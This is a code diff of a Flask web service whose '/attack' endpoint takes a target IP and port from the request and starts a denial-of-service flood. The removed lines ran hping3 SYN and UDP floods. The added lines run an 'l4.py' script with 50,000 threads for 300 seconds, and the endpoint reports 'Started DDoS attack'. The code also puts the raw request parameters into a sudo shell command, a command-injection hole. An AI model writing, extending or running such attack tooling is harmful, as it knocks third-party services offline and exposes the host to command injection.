@@ -22,7 +22,7 @@ def get_screen_session_count():
     except Exception:
         return 0
 
-# 处理攻击请求
+# 处理攻击请求，使用python3 l4.py执行
 @app.route('/attack')
 def attack():
     ip = request.args.get('ip')
@@ -38,15 +38,17 @@ def attack():
 
     session_name = f"ddos_{generate_random_string()}"
     
-    # 构建命令
-    command = f"screen -S {session_name} -dm bash -c 'sudo timeout 300s hping3 -q -S {ip} -p {port} -i u100 -d 8192'"
+    # 构建命令，使用screen来执行python3 l4.py，并自动关闭screen
+    command = (
+        f"screen -S {session_name} -dm bash -c "
+        f"'sudo timeout 300s python3 l4.py {ip}:{port} --threads 50000 --duration 300; "
+        f"screen -S {session_name} -X quit'"
+    )
     
     try:
         # 执行命令
         subprocess.Popen(command, shell=True)
-        command = f"screen -S {session_name} -dm bash -c 'sudo timeout 300s hping3 -q -2 {ip} -p {port} -i u100 -d 8192'"
-        subprocess.Popen(command, shell=True)
-        return f"Started DDoS attack on {ip}:{port} with session {session_name}", 200
+        return f"Started L4 attack on {ip}:{port} with session {session_name}", 200
     except Exception as e:
         return f"Error: {str(e)}", 500
 
